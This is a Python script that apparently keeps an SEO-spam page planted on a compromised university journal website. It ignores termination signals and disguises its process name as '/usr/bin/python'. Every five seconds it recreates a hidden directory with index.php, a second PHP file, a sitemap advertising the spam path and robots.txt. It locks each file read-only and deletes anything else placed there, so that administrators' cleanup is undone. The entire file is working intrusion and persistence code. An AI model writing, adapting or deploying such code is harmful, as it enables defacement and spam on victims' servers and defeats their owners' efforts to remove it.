from __future__ import print_function
import os
import time
import base64
import signal
import sys  # Import the sys module
#nonroot
def signal_handler(signal, frame):
    print('Signal received, but I am not stopping')

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

directory = "/var/www/jurnalfisip/public/site/-/nusa188"
file_path_index = os.path.join(directory, "index.php")
file_path_page = os.path.join(directory, "scrowx.php")
file_path_sitemap = os.path.join(directory, "sitemap.xml")
file_path_robots = os.path.join(directory, "robots.txt")
file_content_index = ""  # Base64 encoded content for index.php
file_content_page = ""
file_content_sitemap = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHVybHNldAogICAgICB4bWxucz0iaHR0cDovL3d3dy5zaXRlbWFwcy5vcmcvc2NoZW1hcy9zaXRlbWFwLzAuOSIKICAgICAgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIKICAgICAgeHNpOnNjaGVtYUxvY2F0aW9uPSJodHRwOi8vd3d3LnNpdGVtYXBzLm9yZy9zY2hlbWFzL3NpdGVtYXAvMC45CiAgICAgICAgICAgIGh0dHA6Ly93d3cuc2l0ZW1hcHMub3JnL3NjaGVtYXMvc2l0ZW1hcC8wLjkvc2l0ZW1hcC54c2QiPgo8IS0tIGNyZWF0ZWQgd2l0aCBGcmVlIE9ubGluZSBTaXRlbWFwIEdlbmVyYXRvciB3d3cueG1sLXNpdGVtYXBzLmNvbSAtLT4KCgo8dXJsPgogIDxsb2M+aHR0cHM6Ly9qdXJuYWxmaXNpcC51aW5zYnkuYWMuaWQvcHVibGljL3NpdGUvLS9udXNhMTg4LzwvbG9jPgogIDxsYXN0bW9kPjIwMjMtMDgtMzBUMTA6MDk6MDIrMDA6MDA8L2xhc3Rtb2Q+CjwvdXJsPgoKCjwvdXJsc2V0Pg=="
file_content_robots = "VXNlci1hZ2VudDogKgpEaXNhbGxvdzogCkRpc2FsbG93OiAvY2dpLWJpbi8="

def set_process_title(title):
    # Modify the first argument in sys.argv to set the process title
    sys.argv[0] = title

def create_directory(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

def create_file(file_path, content):
    with open(file_path, 'w') as file:
        file.write(content)

def delete_files(directory):
    for filename in os.listdir(directory):
        if filename not in ["index.php","sitemap.xml","robots.txt","scrowx.php"]:
            file_path = os.path.join(directory, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    os.rmdir(file_path)
            except Exception as e:
                print('Failed to delete {}. Reason: {}'.format(file_path, e))

def main():
    # Set the process title when the function starts
    set_process_title("/usr/bin/python")
    
    while True:
        if not os.path.exists(directory):
            print("[!] Directory not found")
            print("[!] Creating directory")
            create_directory(directory)
        elif not os.path.exists(file_path_index) or not os.path.exists(file_path_page) or not os.path.exists(file_path_sitemap) or not os.path.exists(file_path_robots):
            print("[!] File not found")
            print("[!] Creating file")
            if not os.path.exists(file_path_index):
                decoded_content_index = base64.b64decode(file_content_index).decode('utf-8')
                create_file(file_path_index, decoded_content_index)
                print("[!] Setting file mode to 0444")
                os.chmod(file_path_index, 0o444)  # Set file mode to 0444
            if not os.path.exists(file_path_page):
                decoded_content_page = base64.b64decode(file_content_page).decode('utf-8')
                create_file(file_path_page, decoded_content_page)
                print("[!] Setting file mode to 0444")
                os.chmod(file_path_page, 0o444)  # Set file mode to 0444
            if not os.path.exists(file_path_sitemap):
                decoded_content_sitemap = base64.b64decode(file_content_sitemap).decode('utf-8')
                create_file(file_path_sitemap, decoded_content_sitemap)
                print("[!] Setting file mode to 0444 for sitemap.xml")
                os.chmod(file_path_sitemap, 0o444)  # Set file mode to 0444
            if not os.path.exists(file_path_robots):
                decoded_content_robots = base64.b64decode(file_content_robots).decode('utf-8')
                create_file(file_path_robots, decoded_content_robots)
                print("[!] Setting file mode to 0444 for robots.txt")
                os.chmod(file_path_robots, 0o444)  # Set file mode to 0444

        else:
            print("[*] File exists")
            print("[*] Deleting files and directories not in the filter list")
            delete_files(directory)
        time.sleep(5)

if __name__ == "__main__":
    main()
